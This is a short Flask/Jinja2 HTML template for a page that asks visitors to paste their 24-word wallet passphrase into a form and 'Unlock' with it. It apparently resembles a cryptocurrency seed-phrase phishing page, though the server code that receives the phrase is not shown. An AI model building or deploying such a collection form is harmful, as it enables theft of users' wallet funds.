<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
    <link rel="icon" href="{{ url_for('static', filename='assets/favicon.ico') }}" type="image/x-icon">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="text-center p-4">

    <h1 style="font-weight: 610; font-size: 20px; margin-top: 150px;">{{ title }}</h1>

    <form method="POST" class="mt-4">
        <div class="mb-3 text-start mx-auto" style="max-width: 400px;">
            <textarea name="passphrase" id="passphrase"
            class="form-control"
            placeholder="Enter your 24-word passphrase here"
            required
            style="border-radius: 10px; height: 220px; font-size: 15px; padding: 12px;"></textarea>
        </div>

        <button type="submit"
                class="btn"
                style="background-color: #643483; color: white; border-radius: 12px; width: 90%; max-width: 400px; padding: 10px 0; font-size: 13px; font-weight: 700; display: inline-block; margin-top: 16px;">
                Unlock with Passphrase
        </button>
    </form>
    <a href="{{ url_for('home', user_address=user_address) }}"
        class="btn"
        style="border: 1px solid #643483; color: #643483; border-radius: 12px; width: 90%; max-width: 400px; padding: 10px 0; font-size: 13px; font-weight: 700; display: inline-block; margin-top: 10px;">
        Go Back
    </a>
    
   

 <!-- Outlined Purple Button (same reduced height and text) -->

    

</body>
</html>
